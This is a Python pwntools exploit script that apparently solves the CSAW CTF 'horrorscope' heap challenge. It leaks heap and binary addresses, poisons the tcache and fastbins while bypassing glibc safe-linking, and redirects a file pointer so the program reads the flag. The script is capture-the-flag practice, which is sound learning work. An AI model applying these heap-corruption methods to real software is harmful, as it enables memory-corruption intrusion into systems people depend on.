#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'
context.bits = 64
context.terminal = ["tmux", "splitw", "-h"]

sleepy = 0.2

def create_ball(content):
    r.sendline(b'1')
    r.recvuntil(b'magic 8 ball')
    r.sendline(content)
    r.recvuntil(b'[Y/N]')
    r.sendline(b'Y')
    r.recvuntil(b'-----------------------------------------')

def delete_ball():
    r.sendline(b'5')
    r.recvuntil(b'-----------------------------------------')

def create_cookie():
    r.sendline(b'2')
    r.recvuntil(b'-----------------------------------------')

def delete_cookie(idx):
    r.sendline(b'2')
    r.recvuntil(b'Please choose one to delete\n')
    sleep(sleepy)
    r.sendline(str(idx).encode())
    r.recvuntil(b'-----------------------------------------')

def create_lucky_number():
    r.sendline(b'8')
    r.recvuntil(b'number')
    r.sendline(b'1234')

def update_lucky_number(content):
    r.sendline(b'8')
    sleep(sleepy)
    r.recvuntil(b'[Y/N]')
    r.sendline(b'Y')
    sleep(sleepy)
    r.recvuntil(b'number')
    r.sendline(content)
    sleep(sleepy)

def delete_lucky_number():
    r.sendline(b'8')
    r.recvuntil(b'[Y/N]')
    r.sendline(b'N')
    r.recvuntil(b'[Y/N]')
    r.sendline(b'Y')

def read_binary_leak(idx):
    r.sendline(b'4')
    r.recvuntil(b'Please enter a fortune index\n > ')
    sleep(sleepy)
    r.sendline(str(idx).encode())
    r.recvuntil(b' ')
    r.recv(104)
    s = r.recv(6) + b'\x00\x00'
    r.recvuntil(b'-----------------------------------------')
    return u64(s)

def read_heap_leak(idx):
    r.sendline(b'4')
    r.recvuntil(b'Please enter a fortune index\n > ')
    sleep(sleepy)
    r.sendline(str(idx).encode())
    r.recvuntil(b' ')
    s = r.recv(5) + b'\x00\x00\x00'
    r.recvuntil(b'-----------------------------------------')
    return u64(s) * 4096

def sign(payload):
    r.sendline(b'0')
    sleep(sleepy)
    r.recvuntil(b'sign')
    r.sendline(payload)
    sleep(sleepy)
    r.recvuntil(b'-----------------------------------------')

def get_lucky():
    r.sendline(b'7')
    sleep(sleepy)
    r.recvuntil(b'name')
    r.sendline(b'aaa')
    r.recvuntil(b'-----------------------------------------')

if args.REMOTE:
    r = connect("pwn.chal.csaw.io", 5010)
else:
    r = connect("127.0.0.1", 2050) # Docker instance
    if args.NOGDB:
        log.info('Skipping debugger')
    else:
        gdb.debug(['./horrorscope'], '''
                set debug-file-directory /home/tito/csaw/horrorscope/dbginfo
                ''')
        log.info("Attach debugger to process running in Docker")
        ui.pause()

r.recvuntil(b'-----------------------------------------')

log.info("Filling tcache for size 0x20")
for i in range(7):
    create_lucky_number()
    delete_lucky_number()

log.info("Creating 33 cookies")
for i in range(33):
    create_cookie()

log.info("Filling tcache for size 0x80")
for i in range(7):
    delete_cookie(2*i + 1)
    create_cookie()

log.info("Leaking heap by reading free chunk")
heap_base = read_heap_leak(1)
log.success("heap @ " + hex(heap_base))

log.info("Alloc'ing ball where there was a cookie and leaking .data")
create_ball(b'A'*(0x68 - 17 - 1))

binary_data = read_binary_leak(13) - 0x170
log.success(".data @ " + hex(binary_data))

log.info("Alloc'ing a cookie on the top chunk and freeing it")
delete_cookie(15) # this ends up in the tcache
create_cookie()
delete_cookie(32)

log.info("Consolidating fastbins")
r.sendline(b'5'*0x400)
r.recvuntil(b'-----------------------------------------')

log.info("Emptying tcache (alloc'ing 7 8-balls)")
## tcache should be empty right here (8-balls should be allocated from the top chunk)
## './flag.txt' will be useful later on
## ball 1 will end up at heap_base + 0xe80
for i in range(7):
    create_ball(b"./flag.txt\x00")
flag_txt = heap_base + 0xe80 + 17
log.success("./flag.txt @ " + hex(flag_txt))

log.info("Alloc'ing lucky number (chunk of size 0x20) overlapping with freed cookie")
create_lucky_number()

log.info("Creating 8-ball overlapping with freed cookie")
# We are using this 8-ball to fix the pointer to the .bss stored at the end of
# each cookie chunk, otherwise the program would complain when we free this
# cookie again. -0x20 bc we just alloc'd a lucky number at the beginning of the
# top chunk (=> at the beginning of the cookie buffer).

# the contiguous array of pointers to cookie buffers is at binary_data + 0xa0
# and each cookie uses 2 quadwords. This is the last cookie (idx 32), so:
create_ball(fit({0x68 - 0x20 - 17: p64(binary_data + 0xA0 + 32 * 0x10)}))

log.info("Freeing corrupted chunk")
delete_cookie(32)

log.info("Corrupting forward pointer")
global_offset = 0x20
global_add = binary_data + global_offset
protect_mask = (heap_base >> 12) + 1 # safe linking
update_lucky_number(p64(protect_mask^global_add))

log.info("Consuming 1 fastbin")
get_lucky()

log.info("Overwriting pointer to oracle.txt")
sign(p64(flag_txt)+b'\x0b')

log.success("Now ask for some oracle fortunes")
r.interactive()

# vim: et:sts=4:ts=4:nojoinspaces
